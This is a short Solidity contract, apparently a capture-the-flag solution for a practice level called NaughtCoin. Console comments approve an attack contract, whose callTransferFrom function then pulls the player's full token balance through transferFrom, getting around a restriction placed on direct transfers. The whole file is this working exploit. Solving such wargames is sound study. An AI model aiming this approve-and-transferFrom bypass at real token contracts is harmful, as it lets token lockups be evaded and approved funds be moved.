// SPDX-License-Identifier: MIT
// Console:
/// const amount = await contract.balanceOf(player)
/// await contract.approve("Attack contract's address", amount)
pragma solidity ^0.8.0;

interface IntNaughtCoin {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
}

contract NaughtCoinAttack {
    IntNaughtCoin public naughtCoin;

    constructor(address target) {
        naughtCoin = IntNaughtCoin(target);
    }

    function callTransferFrom() public {
        uint256 amount = naughtCoin.balanceOf(msg.sender);
        naughtCoin.transferFrom(msg.sender, address(this), amount);
    }
}
